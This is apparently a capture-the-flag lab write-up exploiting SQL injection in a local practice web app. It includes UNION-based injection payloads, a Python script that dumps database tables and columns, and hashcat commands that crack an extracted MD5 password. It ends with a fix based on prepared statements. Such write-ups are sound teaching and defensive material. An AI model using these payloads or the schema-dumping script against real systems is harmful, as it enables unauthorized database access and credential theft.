# How

The page `/index.php?page=member` only has a basic field, but its HTML type isn't restricted.

I tried to submit `1` which returned :

```
ID: 1 
First name: one
Surname : me
```

Then I tried with `asdf` and it returned a suspicious output :

```
Unknown column 'asdf' in 'where clause'
```

This might look like any kind of error at a first glance.

But I noticed it's the exact raw output of a SQL Server.

Trying a `'` this time reveals that :

`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1`

This text gives us a hint about what would the SQL query could look like :

```sql
SELECT * FROM members WHERE id = '{input}';
```

So we could inject the following (basic) payload :

`1 OR 2`

So our query would look like this :

```sql
SELECT * FROM members WHERE id = '1 OR 2'
```

Which, you guessed it, always returns `true`. So this query basically returns all our rows in the table `members`.

This time I got the output :

```
ID: 1 OR 2 
First name: one
Surname : me

ID: 1 OR 2 
First name: two
Surname : me

ID: 1 OR 2 
First name: three
Surname : me

ID: 1 OR 2 
First name: Flag
Surname : GetThe
```

Since we do not know the SQL schema, we have to find it ourselves.

To find more informations, we can use what is called a 'Union Attack' which consists of maliciously using the `UNION` SQL keyword, which allows us to execute any arbitrary queries after.

Our payload is :

```sql
1 OR 2 UNION SELECT * FROM information_schema.tables;
```

Which will return all users, and all tables in the database. But I faced this issue :
```
The used SELECT statements have a different number of columns
```
So we have to find a way to get as much column in both queries.

We only gonna select the column `TABLE_NAME` and then pad it with as much columns we need.

In the sample above, we see that the returned ID was `1 OR 2`, which is the GET parameter in the URL, not the ID returned by the SQL query.

Knowing that we can deduce that the SQL query is :

```sql
SELECT first_name, surname FROM members WHERE ...
```

So we only need to pad one column :

```sql
1 OR 2 UNION SELECT table_name, 1 FROM information_schema.tables;
```

This returns a lot of tables, but the most interesting ones are :

```
ID: 1 OR 2 UNION SELECT table_name, 1 FROM information_schema.tables; 
First name: users
Surname : 1
ID: 1 OR 2 UNION SELECT table_name, 1 FROM information_schema.tables; 
First name: guestbook
Surname : 1
ID: 1 OR 2 UNION SELECT table_name, 1 FROM information_schema.tables; 
First name: list_images
Surname : 1
ID: 1 OR 2 UNION SELECT table_name, 1 FROM information_schema.tables; 
First name: vote_dbs
Surname : 1
```

I wrote this Python script to fetch the SQL schema of each tables :

```py
import requests
import re
from bs4 import BeautifulSoup

URL = 'http://localhost:4242/index.php?page=member&id={payload}&Submit=Submit#'
res = requests.get(URL.format(payload='1 OR 2 UNION SELECT table_name, column_name FROM information_schema.columns;'))

soup = BeautifulSoup(res.text, 'html5lib')

container = soup.find('div', {'class': 'container'})

tables = {}

TABLE_NAME_REGEX = re.compile(r'(?<=First name: )\w+(?=Surname)')
COLUMN_NAME = re.compile(r'(?<=Surname : )\w+$')

for pre in container.find_all('pre'):
    table_name = TABLE_NAME_REGEX.search(pre.text)[0]
    column_name = COLUMN_NAME.search(pre.text)[0]
    if tables.get(table_name) is None:
        tables[table_name] = []
    tables[table_name].append(column_name)

# Remove system tables (all uppercase)
for table in list(tables.keys()):
    if table.isupper():
        del tables[table]
# Remove false positive
del tables['one']
del tables['two']
del tables['three']
del tables['Flag']
del tables['db_default']

# Leak out all schemas
schemas = []
res = requests.get(URL.format(payload='1 OR 2 UNION SELECT schema_name, 1 FROM information_schema.schemata;'))
soup = BeautifulSoup(res.text, 'html5lib')
container = soup.find('div', {'class': 'container'})
for pre in container.find_all('pre'):
    schema = pre.text.split('Surname :')[0].split('First name: ')[1]
    if schema.startswith('Member'):
        schemas.append(schema)

for table, columns in tables.items():
    print(table, columns)

print(schemas)
```

This script reveals all tables along with their columns, and every schemas.

After testing a lot of queries I noticed that both `Commentaire` and `countersign` columns in the table `Member_Sql_Injection.users` contained fancy informations.

So I tried this payload :

```
/?page=member&id=1%20OR%202%20UNION%20SELECT%20countersign,Commentaire%20FROM%20Member_Sql_Injection.users;&Submit=Submit#
```

And I got this record :

```
ID: 1 OR 2 UNION SELECT countersign,Commentaire FROM Member_Sql_Injection.users; 
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

Bruteforcing the `md5` using `hashcat` with these commands :

1. echo -n '5ff9d0165b4f92b14994e5c685cdce28' > hash.md5
2. `hashcat 5ff9d0165b4f92b14994e5c685cdce28 -O -d 2 -m 0 -a 3 -1 '?l?u?d' '?1?1?1?1?1?1?1?1'`

Returns this after few seconds :

```
5ff9d0165b4f92b14994e5c685cdce28:FortyTwo                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5ff9d0165b4f92b14994e5c685cdce28
Time.Started.....: Tue Jun 27 16:06:54 2023 (1 min, 12 secs)
Time.Estimated...: Tue Jun 27 16:08:06 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]
Guess.Charset....: -1 ?l?u?d, -2 Undefined, -3 Undefined, -4 Undefined 
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:   129.5 GH/s (7.94ms) @ Accel:32 Loops:1024 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 9501759504384/218340105584896 (4.35%)
Rejected.........: 0/9501759504384 (0.00%)
Restore.Point....: 39845888/916132832 (4.35%)
Restore.Sub.#2...: Salt:0 Amplifier:4096-5120 Iteration:0-1024
Candidate.Engine.: Device Generator
Candidates.#2....: busNggRA -> BYAs5uKI
Hardware.Mon.#2..: Temp: 77c Fan: 61% Util: 99% Core:2715MHz Mem:10251MHz Bus:16
```

So, to get the flag we lowecase it :

* echo -n "FortyTwo" | tr '[:upper:]' '[:lower:]' | sha256sum

And we get the flag : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`


# Fix

- Sanitize user's input by escaping each special characters
- Use prepared statements. Example in PHP:

```
$id = $_GET["id"];

$pdo = new PDO(
    dsn: "mysql:host=localhost;dbname=list_images;charset=utf-8;port=3306",
    username: "username",
    password: "password",
);
$stmt = $pdo->prepare("SELECT * FROM members WHERE id = ?");
$stmt->execute([$id]);
```
